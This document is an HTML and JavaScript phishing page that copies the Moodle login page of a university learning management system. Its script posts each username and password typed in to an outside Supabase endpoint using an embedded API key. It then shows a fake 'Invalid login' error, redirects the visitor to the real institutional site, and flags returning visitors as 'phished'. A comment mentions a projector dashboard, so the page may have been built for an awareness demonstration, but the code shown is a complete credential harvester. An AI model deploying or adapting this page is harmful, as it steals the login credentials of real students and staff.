<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Learning Management System: Log in to the site</title>
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
            font-size: 15px;
            font-weight: 400;
            color: #1d2125;
            background-color: #f2f3f7;
        }


        /* ===== LOGIN PAGE (exact Moodle replica) ===== */
        .login-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .loginform {
            background: #fff;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 528px;
        }

        .login-logo {
            margin-bottom: 16px;
        }

        .login-logo img {
            max-width: 100%;
            height: auto;
            display: block;
        }

        .login-heading {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-control-lg {
            display: block;
            width: 100%;
            padding: 8px 16px;
            font-size: 18.75px;
            font-weight: 400;
            font-family: Roboto, sans-serif;
            color: #495057;
            background-color: #fff;
            border: 1px solid #8f959e;
            border-radius: 9.6px;
            outline: none;
            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            -webkit-appearance: none;
        }

        .form-control-lg:focus {
            border-color: #0f47ad;
            box-shadow: 0 0 0 0.2rem rgba(15, 71, 173, 0.25);
        }

        .form-control-lg::placeholder {
            color: #6c757d;
        }

        .btn-primary {
            display: block;
            width: 100%;
            padding: 8px 16px;
            font-size: 18.75px;
            font-weight: 400;
            font-family: Roboto, sans-serif;
            color: #fff;
            background-color: #0f47ad;
            border: 1px solid #0f47ad;
            border-radius: 9.6px;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.15s ease-in-out;
        }

        .btn-primary:hover {
            background-color: #0d3d94;
            border-color: #0d3d94;
        }

        .login-form-forgotpassword {
            text-align: center;
            margin-top: 8px;
        }

        .login-form-forgotpassword a {
            color: #0f47ad;
            text-decoration: none;
            font-size: 15px;
        }

        .login-form-forgotpassword a:hover {
            text-decoration: underline;
        }

        .cookies-row {
            display: flex;
            margin-top: 8px;
        }

        .btn-link {
            margin-left: auto;
            background: none;
            border: 1px solid transparent;
            border-radius: 8px;
            color: #0f47ad;
            font-size: 15px;
            font-family: Roboto, sans-serif;
            padding: 6px 12px;
            cursor: pointer;
        }

        .btn-link:hover {
            text-decoration: underline;
        }

        .btn-link i {
            margin-right: 4px;
        }

        /* ===== ERROR BANNER (exact Moodle computed styles) ===== */
        .login-error {
            display: none;
            background-color: rgb(244, 214, 210);
            color: rgb(105, 25, 17);
            padding: 12px 20px;
            margin-bottom: 16px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 400;
            line-height: 22.5px;
            text-align: left;
        }

        .login-error.active {
            display: block;
        }

    </style>
</head>
<body>

    <!-- FAKE LOGIN (exact Moodle Moove theme replica) -->
    <div id="loginPage">
        <div class="login-wrapper">
            <div class="loginform">
                <div class="login-logo">
                    <img id="logoimage" src="logo.png" class="img-fluid" alt="Learning Management System">
                    <h1 class="login-heading">Log in to Learning Management System</h1>
                </div>

                <div class="login-error" id="loginError">Invalid login, please try again</div>

                <form id="loginForm" onsubmit="return handleLogin(event)">
                    <div class="form-group">
                        <label for="username" class="login-heading">Username</label>
                        <input type="text" name="username" id="username" class="form-control-lg" placeholder="Username" autocomplete="username">
                    </div>
                    <div class="form-group">
                        <label for="password" class="login-heading">Password</label>
                        <input type="password" name="password" id="password" class="form-control-lg" placeholder="Password" autocomplete="current-password">
                    </div>
                    <div class="form-group">
                        <button class="btn-primary" type="submit" id="loginbtn">Log in</button>
                    </div>
                    <div class="login-form-forgotpassword">
                        <a href="#" onclick="return false;">Lost password?</a>
                    </div>
                </form>

                <div class="cookies-row">
                    <button type="button" class="btn-link" onclick="return false;"><i class="fa fa-question-circle"></i> Cookies notice</button>
                </div>
            </div>
        </div>
    </div>


    <script>
        (function() {
            // Returning visitor — redirect to real Moodle immediately
            if (localStorage.getItem('phished')) {
                window.location.replace('https://lms.apiu.edu/login/index.php');
            }
        })();

        function handleLogin(e) {
            e.preventDefault();

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            if (!username || !password) return false;

            // Mark as phished so revisits redirect to real Moodle
            localStorage.setItem('phished', '1');

            // Send to Supabase (for projector dashboard)
            fetch('https://omrrknnkudkawxkhplao.supabase.co/rest/v1/submissions', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcnJrbm5rdWRrYXd4a2hwbGFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMjczMDgsImV4cCI6MjA4ODYwMzMwOH0.8gbMXjn6rSiwCBjnp3YXkdkexPZAZDl4U8WD579ySEw',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcnJrbm5rdWRrYXd4a2hwbGFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMjczMDgsImV4cCI6MjA4ODYwMzMwOH0.8gbMXjn6rSiwCBjnp3YXkdkexPZAZDl4U8WD579ySEw'
                },
                body: JSON.stringify({ username: username, password: password })
            }).catch(function() {});

            // Show "Invalid login" error (matches real Moodle exactly)
            document.getElementById('loginError').classList.add('active');
            document.getElementById('password').value = '';

            // Redirect to real Moodle after 3 seconds (as if nothing happened)
            setTimeout(function() {
                window.location.href = 'https://lms.apiu.edu/login/index.php';
            }, 3000);

            return false;
        }
    </script>
</body>
</html>
